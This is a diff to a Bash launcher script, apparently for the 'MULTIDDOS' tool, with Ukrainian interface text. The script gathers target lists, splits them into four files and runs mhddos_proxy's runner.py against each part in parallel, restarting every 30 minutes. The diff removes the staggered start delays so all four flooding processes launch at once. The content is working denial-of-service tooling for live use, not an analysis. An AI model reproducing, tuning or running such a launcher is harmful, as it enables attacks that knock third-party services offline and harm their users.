@@ -62,7 +62,7 @@ toilet -t --metal " MULTIDDOS"
 typing_on_screen 'Шукаю завдання...' ; sleep 0.5
 echo -e "\n\nTotal targets found:" "\x1b[32m $(cat ~/multidd/targets/all_targets.txt | wc -l)\x1b[m" && sleep 0.1
 echo -e "Uniq targets:" "\x1b[32m $(cat ~/multidd/targets/uniq_targets.txt | wc -l)\x1b[m" && sleep 0.1
-echo -e "\nЗавантаження..."; sleep 3
+echo -e "\nЗавантаження..."; sleep 2
 clear
 }
 export -f prepare_targets_and_banner
@@ -133,11 +133,11 @@ while true; do
     else
         cd ~/multidd/targets/; split -n l/4 --additional-suffix=.uaripper ~/multidd/targets/uniq_targets.txt; cd ~/multidd/mhddos_proxy #split targets in N parts
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xaa.uaripper $methods $threads $args_to_pass &
-        sleep 5 # to decrease load on cpu during simultaneous start
+        #sleep 5 # to decrease load on cpu during simultaneous start
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xab.uaripper $methods $threads $args_to_pass &
-        sleep 5 # to decrease load on cpu during simultaneous start
+        #sleep 5 # to decrease load on cpu during simultaneous start
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xac.uaripper $methods $threads $args_to_pass &
-        sleep 5 # to decrease load on cpu during simultaneous start
+        #sleep 5 # to decrease load on cpu during simultaneous start
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xad.uaripper $methods $threads $args_to_pass &
     fi
 sleep 30m
